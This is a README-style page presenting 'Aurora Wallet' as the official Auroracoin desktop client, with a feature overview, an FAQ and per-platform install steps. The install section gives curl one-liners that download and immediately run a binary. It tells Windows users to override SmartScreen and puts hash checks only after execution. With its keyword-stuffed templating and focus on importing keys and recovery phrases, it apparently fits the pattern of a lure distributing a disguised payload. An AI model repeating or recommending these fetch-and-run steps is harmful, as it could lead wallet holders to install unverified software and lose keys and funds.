![Aurora Wallet what is aurora wallet guide](assets/aurora-wallet-guide-article-banner.png)

# What is Aurora Wallet? The official Auroracoin desktop client

The self-custody application that holds, sends and receives AUR on Windows, macOS and Linux.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Aurora Wallet is the desktop client published by the Auroracoin Foundation for the Auroracoin (AUR) network, and it is the program this guide set supports.

Aurora Wallet is a desktop application that stores your Auroracoin private keys on your own computer, signs transactions locally and connects directly to the Auroracoin peer network. It runs on Windows, macOS and Linux, keeps the same wallet format on all three, and restores a balance from a twelve or twenty-four word BIP-39 recovery phrase.

<!-- ARTICLE-BODY-BEGIN -->

## What the application actually does

The wallet covers the tasks a holder needs on a desktop: receive AUR to an address with a QR code, send AUR to any valid address, keep a labelled address book, watch each transaction move from broadcast to confirmation and encrypt the local wallet file with a password. It also imports the holdings that predate it, reading legacy `wallet.dat` files, WIF private keys and paper wallet keys into a phrase-backed wallet.

The interface keeps the network state visible at the bottom of the window: block height, peer count and sync percentage. That line answers most questions before they become support requests, because a balance that looks wrong is usually a chain that has not finished catching up.

## Where your keys live

Self-custody means the keys are generated on your machine and never leave it. The wallet file sits in a data directory on your disk, protected by the password you choose, and the recovery phrase is the human-readable master copy of those keys. Nothing is stored on a Foundation server, and there is no account to reset, which is why the phrase deserves paper and a safe place rather than a screenshot.

The address derivation follows the BIP-44 path m/44'/85'/0'/0/i, so a new installation of a compatible wallet rebuilds the same addresses from the same phrase.

That phrase is the backup that matters most, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring with the recovery phrase</a> shows how a replacement machine reaches the same balance.

## How to start using it

Install the current build for your system, open it once and let the chain finish downloading before you send anything to it. The <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a> carries the installers and the SHA-256 values for all three platforms.

The next step is <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/02-first-run-setup.md">first-run setup walkthrough</a>, which covers the phrase, the password and the data directory in order.

If you want the background of the coin before the software, read <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md">what Auroracoin actually is</a> first.

## FAQ

### Is Aurora Wallet the same as Auroracoin Core?

No. Auroracoin Core was the original full-node client of the network. Aurora Wallet is the current desktop application, lighter to run and built around a recovery phrase instead of a single wallet file.

### Do I have to buy anything to use it?

The application is free and open source under the MIT license. The only cost of using it is the network fee attached to a transaction you send.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [First-run setup](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/02-first-run-setup.md)
- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
- [Aurora Wallet FAQ](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/38-aurora-wallet-faq.md)
